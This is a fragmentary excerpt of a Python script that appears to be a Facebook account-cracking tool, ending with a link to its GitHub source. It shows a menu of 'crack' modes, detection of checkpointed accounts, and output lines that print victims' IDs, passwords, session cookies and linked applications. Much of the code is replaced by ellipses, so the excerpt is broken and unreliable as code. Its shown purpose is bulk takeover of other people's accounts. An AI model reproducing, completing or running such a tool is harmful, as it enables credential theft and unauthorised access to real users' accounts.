...
'\x1b[1;92m'   Github      ||     MRRAKIB404  
'\x1b[1;93m'   FB ID       ||    MD RAKIB HOSSEN 
...
def setting():
	...
	banner()
	print('')
	print('1. Crack Old😒LOOL💔  ')
	print(f'2. Crack New MAST OK IDZ 😎 {h} Recommended{h}{x}')
	print(f'3. Random {h}LOOL HA 💔{h}{x}')
	print('')
	hu = input('Enter  : ')
	if hu in ['1','01']:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'Aadi-CP😴[•] ID       : {idf} [•] PASSWORD : {pw}'
				...
				if 'no' in taplikasi:
					...
					hit=0
					infoakun += (f"\n[bold yellow]Aadi-CP😰[•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					...
					print('\n')
					statusok = f'[bold green]Aadi-OK😘[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
...
if __name__=='__main__':
	...
	login()"
 https://raw.githubusercontent.com/dEvIL05K/AADI-MALIK/main/AADI-X-Z.py#:~:text=%23%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%5B%20IMPORT%2DMODULE%20%5D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%0Aimport,txt%27)%0A%09except%3Apass%0A%09login()